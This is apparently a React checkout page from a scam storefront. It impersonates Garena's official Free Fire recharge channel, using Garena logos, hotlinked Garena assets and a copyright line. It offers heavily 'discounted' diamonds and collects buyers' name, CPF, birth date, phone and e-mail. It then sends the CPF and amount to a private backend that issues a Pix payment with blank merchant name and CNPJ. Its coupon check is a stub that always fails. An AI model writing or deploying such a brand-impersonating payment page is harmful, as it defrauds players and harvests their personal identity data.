// src/components/checkout/CheckoutPage.tsx
import React, { useState, useEffect } from 'react';
import { ArrowLeft, ShoppingBag } from 'lucide-react';
import { Product, CustomerData, PaymentMethod, Order } from '../../types/checkout';
import OrderSummary from './OrderSummary';
import CustomerForm from './CustomerForm';
import PaymentMethods from './PaymentMethods';
import CouponInput from './CouponInput';
import PixPayment from '../checkout/PixPayment';
import { getUTMParams, sendAnalyticsEvent } from '../../services/checkoutService';
import {
  validateCPF, validatePhone, validateCEP, validateBirthDate, formatPhone, formatCPF, validateEmail
} from '../../utils/validators';
import '../../styles/checkout.css';
import '../../styles/checkout-garena.css';

import { maskPhone, maskCPF, maskDate } from "../../utils/masks";
import { emailSuggestion } from "../../utils/emailAutoComplete";

import UpsellModal from "../UpsellModal";


interface CheckoutPageProps {
  initialProducts?: Product[];
  onBack?: () => void;
}

interface UpsellModalProps {
  visible: boolean;
  onClose: () => void;
  onAdd: (item: UpsellItem | null) => void;
  onContinue: () => void;
}

const defaultProducts: Product[] = [
  {
    id: '1',
    name: '5.600 Diamantes',
    sku: 'FF-5600-DM',
    quantity: 1,
    price: 19.90,
    originalPrice: 199.00,
    imageUrl: '/diamantes.png',
    bonus: '1.200 bônus',
  },
];





export default function CheckoutPage({ initialProducts, onBack }: CheckoutPageProps) {
  // --- estados / lógica ---
  const [products, setProducts] = useState<Product[]>(initialProducts || defaultProducts);
  const [couponInput, setCouponInput] = useState<string>("");
  const [isApplying, setIsApplying] = useState(false);
  const [couponMessage, setCouponMessage] = useState<string | null>(null);

  const [showPix, setShowPix] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const resetUpsell = () => setUpsell(null);
  const [upsell, setUpsell] = useState<UpsellItem | null>(null);


  // ======================================================
  // TOTAL DO PEDIDO (PRODUTO PRINCIPAL + UPSELLS)
  // ======================================================
  const [selectedUpsells, setSelectedUpsells] = useState<any[]>([]);
  // soma dos produtos principais
  const subtotal = products.reduce((acc, p) => acc + p.price * p.quantity, 0);

  // soma dos upsells selecionados (1 item máximo)
  const upsellTotal = selectedUpsells.length > 0 ? selectedUpsells[0].price : 0;
  const basePrice = 19.90; // ou passe via props

  // soma final
  const finalAmount = basePrice + (upsell?.price ?? 0);



  // valor a ser enviado ao backend
  const amount = finalAmount;

  const [loading, setLoading] = useState(false);

  const [showUpsell, setShowUpsell] = useState(false);



  const [customerData, setCustomerData] = useState<CustomerData>({
    fullName: "",
    cpf: "",
    phone: "",
    email: "",
    birthDate: "",
  });


  const [errors, setErrors] = useState({
    name: '',
    cpf: "",
    email: "",
    phone: "",
    birthDate: ""
  });

  const getFieldMessage = (field: string) => {
    switch (field) {
      case "cpf": return "CPF inválido.";
      case "email": return "E-mail inválido.";
      case "phone": return "Telefone inválido.";
      case "birthDate": return "Data de nascimento inválida.";
      default: return "Campo inválido.";
    }
  };

  const handleValidateCustomerField = (field: keyof typeof errors, isValid: boolean) => {
    setErrors(prev => ({ ...prev, [field]: isValid ? "" : getFieldMessage(field) }));
  };

  // auxiliares para atualizar customerData
  const onCustomerChange = (field: keyof CustomerData, value: string) => {
    setCustomerData(prev => ({ ...prev, [field]: value }));
  };

  // CPF (com máscara e validação)
  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value;
    const formatted = maskCPF(raw); // se maskCPF retorna formatado
    setCustomerData(prev => ({ ...prev, cpf: formatted }));
    handleValidateCustomerField("cpf", validateCPF(formatted));
  };

  const handleProceed = () => {
    setShowUpsell(true);
  };


  // email
  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value;
    setCustomerData(prev => ({ ...prev, email: v }));
    const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
    handleValidateCustomerField("email", ok);
  };

  // phone
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "");
    setCustomerData(prev => ({ ...prev, phone: raw }));
    handleValidateCustomerField("phone", validatePhone(raw));
  };

  // birth date
  const handleBirthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value;
    setCustomerData(prev => ({ ...prev, birthDate: v }));
    handleValidateCustomerField("birthDate", validateBirthDate(v));
  };

  // cupom
  const applyCoupon = async () => {
    if (!couponInput.trim()) return;
    setIsApplying(true);
    // simulação, implementar validação real depois
    await new Promise(res => setTimeout(res, 600));
    setIsApplying(false);
    setCouponMessage("Cupom inválido ou expirado.");
  };

  const handleCreatePix = async () => {
    try {
      setLoading(true);
      console.log("VALOR ENVIADO AO BACKEND:", amount);

      const formattedValue = Number(amount).toFixed(2); // 👈 AQUI ARRUMA

      const response = await fetch("http://192.168.15.30:3001/api/create-pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          value: formattedValue,
          user_id: customerData.telegramId,
          cpf: customerData.cpf.replace(/\D/g, "")
        })
      });

      const data = await response.json();
      console.log("PIX CREATED:", data);

      if (!data.pixId || !data.code) {
        alert("Erro ao gerar PIX");
        return;
      }

      setPixData({
        identifier: data.pixId,
        pixCode: data.code,
        qrCodeBase64: data.qr,   // <<< aqui agora vem do servidor
        merchant: " ",
        cnpj: " "
      });

      setShowPix(true);

    } catch (err) {
      console.error(err);
      alert("Erro ao criar PIX");
    } finally {
      setLoading(false);
    }
  };






  const allValid =
    (customerData.fullName || "").trim().length >= 3 &&
    validateCPF(customerData.cpf) &&
    validatePhone(customerData.phone) &&
    validateBirthDate(customerData.birthDate || "") &&
    errors.email === "";

  // --- JSX ---
  return (
    <>
      <img
        className="background-ff"
        src="https://assets.recargajogo.com.br/gop/mshop/www/live/assets/FF-06d91604.png"
        alt=""
      />

      <div
        className="ff-background"

      >
        <header className="sticky-alt">
          <div className="container-alt">
            <div className="flex-alt align-center-alt justify-between-alt">
              <a href="/" className="flex-alt align-center-alt">
                <div className="flex-alt align-center-alt">
                  <img src="/images/logo_mobile.svg" alt="Garena" className="block-alt show-mobile-alt" />
                  <img src="/images/logo.svg" alt="Garena" className="none-alt show-desktop-alt" />
                  <div className="divider-alt"></div>
                </div>
                <div className="header-text-alt">Canal Oficial de Recarga</div>
              </a>

              <div className="flex-alt align-center-alt">
                <img src="/images/avatar.svg" alt="Player Avatar" width={30} style={{ borderRadius: "50%" }} />
              </div>
            </div>
          </div>
        </header>

        <main>
          <form onSubmit={(e) => e.preventDefault()} className="ff-checkout-grid">
            <section className="ff-card">
              <button type="button" className="ff-back-btn" onClick={onBack}> Voltar</button>

              <div className="ff-card-top">
                <div className="ff-banner">
                  <img src="/images/FF-f997537d.jpg" alt="Banner" />
                </div>

                <div className="ff-game-icon">
                  <img src="/images/icon.png" alt="Free Fire" />
                </div>

                <h2 className="ff-game-title">Free Fire</h2>
              </div>

              <div className="ff-background-total">
                <div className="ff-totals">
                  <div className="ff-total-line">
                    <span>Total</span>
                    <span className="value"><small className="diamond"><img style={{ width: 16, display: 'inline' }} src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></small> {products.reduce((a, b) => a + b.quantity * (b.price), 0).toFixed(2)} </span>
                  </div>
                  <div className="ff-breakdown">
                    <div className="item"><span>Preço Original</span><span><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> 65</span></div>
                    <div className="item"><span>+ Bônus Geral</span><span><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" />  13</span></div>
                  </div>
                </div>
                <p className="ff-note">Os diamantes serão creditados diretamente na conta do jogo assim que recebermos a confirmação de pagamento.</p>

                <div className="ff-info-rows">
                  <div className="row"><span>Preço</span><strong>R$  {finalAmount.toFixed(2)}</strong></div>
                  <div className="row mobile"><span>Método de pagamento</span><strong>Pix via PagSeguro</strong></div>
                </div>
              </div>

              {!showPix && (
                <div className="checkout-form">
                  <div className="cupom-area">
                    <label>Código Promocional</label>
                    <div className="cupom-box">
                      <input type="text" placeholder="Código Promocional. Exemplo: PROMO1234" value={couponInput} onChange={(e) => setCouponInput(e.target.value)} className="cupom-input" />
                      <button type="button" className={`btn-aplicar ${couponInput.trim() ? "ativo" : "inativo"}`} disabled={!couponInput.trim() || isApplying} onClick={applyCoupon}>
                        {isApplying ? "Aplicando..." : "Aplicar"}
                      </button>
                    </div>
                    {couponMessage && <p style={{ color: "#ff4d4d", fontSize: "12px", marginTop: "6px" }}>{couponMessage}</p>}
                    <p className="legend">Possui um cupom de desconto? Digite acima para aplicar</p>
                  </div>

                  <div className="input-group">
                    <label>Nome Completo </label>
                    <input type="text" placeholder="Nome Completo" value={customerData.fullName} onChange={(e) => onCustomerChange("fullName", e.target.value)} />
                  </div>

                  <div className="input-group">
                    <label>E-mail </label>
                    <input type="text" value={customerData.email} onChange={handleEmailChange} />
                    {errors.email && <p className="error-text">{errors.email}</p>}
                  </div>

                  <div className="two-columns">
                    <div className="input-group">
                      <label>CPF </label>
                      <input type="text" value={customerData.cpf} onChange={handleCPFChange} placeholder="CPF" />
                      {errors.cpf && <p className="error-text-cpf">{errors.cpf}</p>}
                    </div>
                    <div className="input-group">
                      <label>Data de Nascimento</label>
                      <input type="text" value={customerData.birthDate} onChange={handleBirthChange} placeholder="DD/MM/AAAA" />
                      {errors.birthDate && <p className="error-text-data">{errors.birthDate}</p>}
                    </div>
                  </div>

                  <div className="input-group">
                    <label>Número de telefone </label>
                    <input type="text" value={formatPhone(customerData.phone)} onChange={handlePhoneChange} placeholder="Número de telefone" />
                    {errors.phone && <p className="error-text">{errors.phone}</p>}
                  </div>

                  <button
                    type="button"
                    className={`pay-button ${allValid ? "active" : "disabled"}`}
                    disabled={!allValid || loading}
                    onClick={() => {
                      if (!allValid) return;
                      setShowUpsell(true);      // abre upsell
                    }}
                  >
                    {loading ? "Gerando Pix..." : "Prosseguir para pagamento"}
                  </button>

                </div>
              )}
            </section>
          </form>

          {showPix && (
            <PixPayment
              identifier={pixData.identifier}   // ✔ O ID do easy-pix
              pixCode={pixData.pixCode}         // ✔ O código copia e cola
              qrCodeBase64={pixData.qrCodeBase64} // ✔ vai estar vazio mesmo
              amount={amount}
              merchantName={pixData.merchant}
              merchantCnpj={pixData.cnpj}
              onBack={() => {
                resetUpsell();   // ← volta para 19.90 sempre
                setShowPix(false); // ← sua lógica atual
              }}
              onPaid={() => setShowPix(false)} // pode trocar depois para redirecionar
            />
          )}

          <UpsellModal
            visible={showUpsell}
            onClose={() => setShowUpsell(false)}
            onAdd={(item) => {
              setUpsell(item);
            }}

            onContinue={() => {
              setShowUpsell(false);
              handleCreatePix();
            }}
          />


        </main>

        <div className="checkout-footer" style={{ marginTop: '28px' }}>
          <div className="checkout-footer-container">
            <div className="checkout-footer-content d-flex align-items-center justify-content-between" style={{ padding: '18px 0' }}>
              <span>© Garena Online. Todos os direitos reservados.</span>
              <div className="checkout-footer-links">
                <a href="#">FAQ</a>
                <span className="divider">|</span>
                <a href="#">Termos e Condições</a>
                <span className="divider">|</span>
                <a href="#">Política de Privacidade</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      {console.log("showPix:", showPix)}
    </>
  );
}
